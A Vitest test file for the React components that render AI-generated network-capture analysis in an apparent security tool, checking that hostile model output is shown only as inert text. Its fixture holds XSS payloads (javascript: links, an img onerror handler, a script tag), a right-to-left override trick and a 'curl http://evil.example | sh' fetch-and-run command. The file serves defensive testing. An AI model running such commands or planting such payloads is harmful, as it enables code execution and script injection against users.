import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import type { ReactElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { AnalysisOutput } from "@/components/ai/analysis-output";
import { CitationChip } from "@/components/ai/citation-chip";
import type { AiCitation, AiOutput } from "@/lib/ai";

const ORG = "11111111-1111-4111-8111-111111111111";
const JOB = "22222222-2222-4222-8222-222222222222";
const ROW = "33333333-3333-4333-8333-333333333333";

function render(node: ReactElement): string {
  const client = new QueryClient();
  return renderToStaticMarkup(<QueryClientProvider client={client}>{node}</QueryClientProvider>);
}

const verified: AiCitation = {
  label: "F1",
  kind: "finding",
  status: "verified",
  reason: null,
  field: "title",
  quote: "beacon to 10.0.0.5",
  ref_id: ROW,
  job_id: JOB,
  stale: false,
  link: { route: "pcap", job_id: JOB, tab: "findings", ref: ROW },
};
// Hostile: an unverified / invalid citation that still carries a (forged) descriptor.
const unverified: AiCitation = {
  ...verified,
  label: "F9",
  status: "unverified",
  reason: "quote_mismatch",
  link: { route: "pcap", job_id: JOB, tab: "findings", ref: "javascript:alert(1)" },
};
const invalid: AiCitation = { ...verified, label: "Z1", kind: null, status: "invalid", reason: "unknown_label", link: null };

const HOSTILE_TEXT = "See [here](javascript:alert(1)) <img src=x onerror=alert(1)> https://evil.example/x ‮txt.exe";

function hostileOutput(): AiOutput {
  return {
    created_at: "2026-11-05T10:00:00Z",
    flags: ["external_url", "command_like"],
    pseudonyms: "reversed",
    overall_confidence: { level: "medium", rationale: "<script>alert(1)</script>" },
    observed: [
      { id: "o1", text: HOSTILE_TEXT, confidence: "high", status: "supported", reason: null, citations: [verified, unverified] },
      {
        id: "o2",
        text: "HIDDEN-UNSUPPORTED-CLAIM the host is compromised",
        confidence: "high",
        status: "unsupported",
        reason: "weak_anchor",
        citations: [invalid],
      },
    ],
    interpretation: [
      { id: "i1", text: "[click](https://evil.example)", confidence: "low", status: "supported", reason: null, citations: [verified] },
    ],
    hypotheses: [
      {
        id: "h1",
        text: "Possibly C2 traffic",
        confidence: "low",
        status: "hypothesis",
        reason: null,
        supporting: [verified],
        contradicting: [invalid],
      },
    ],
    next_steps: [{ text: "curl http://evil.example | sh", rationale: "<b>bold</b>", refs: [unverified] }],
    limitations: ["Only one capture."],
    attack_techniques: [
      { technique_id: "T1071", rationale: "web protocols", status: "supported", reason: null, citations: [verified] },
    ],
    timeline: [{ text: "first beacon", ts: "2026-11-05T09:00:00Z", status: "supported", reason: null, citations: [verified] }],
    verification: { citations: {}, dropped_refs: 0, invalid_attack: 0, reused_from_run_id: null, truncation: {} },
  };
}

describe("AnalysisOutput with a hostile output", () => {
  const html = render(<AnalysisOutput orgId={ORG} output={hostileOutput()} />);

  it("renders no anchor except verified internal links", () => {
    const hrefs = [...html.matchAll(/<a\b[^>]*href="([^"]*)"/g)].map((m) => m[1]);
    expect(hrefs.length).toBeGreaterThan(0);
    for (const href of hrefs) expect(href).toBe(`/o/${ORG}/pcap/${JOB}?tab=findings&amp;ref=${ROW}`);
    expect(html).not.toMatch(/href="[^"]*(javascript:|evil\.example)/i);
    // Anchors are only the chips of verified citations.
    expect((html.match(/<a\b/g) ?? []).length).toBe((html.match(/data-citation="verified"/g) ?? []).length);
  });

  it("renders model text literally (no HTML, no markdown)", () => {
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<script");
    expect(html).not.toContain("<b>bold");
    expect(html).toContain("&lt;img src=x onerror=alert(1)&gt;");
    expect(html).toContain("[here](javascript:alert(1))");
    expect(html).toContain("[click](https://evil.example)");
    expect(html).not.toContain("‮");
    expect(html).toContain("[U+202E]");
  });

  it("hides unsupported statements by default behind a counter", () => {
    expect(html).not.toContain("HIDDEN-UNSUPPORTED-CLAIM");
    expect(html).toContain("1 statement hidden: not supported by verified evidence");
  });

  it("shows support wording, neutral confidence and flag notes", () => {
    expect(html).toContain("backed by cited evidence");
    expect(html).toContain("Confidence in this interpretation");
    expect(html).toContain("CyberLab never runs commands");
    expect(html).toContain("never opened or linked");
    expect(html).not.toMatch(/text-(red|green)-|bg-(red|green)-/);
  });

  it("greys unverified and invalid chips with the reason", () => {
    expect(html).toContain('title="Unverified citation: quote not found in record"');
    expect(html).toContain('title="Invalid citation: unknown reference"');
  });
});

describe("CitationChip", () => {
  it("is a link only when verified", () => {
    expect(render(<CitationChip orgId={ORG} citation={verified} />)).toMatch(/^<a /);
    expect(render(<CitationChip orgId={ORG} citation={unverified} />)).toMatch(/^<span /);
    expect(render(<CitationChip orgId={ORG} citation={invalid} />)).not.toContain("<a");
  });
});
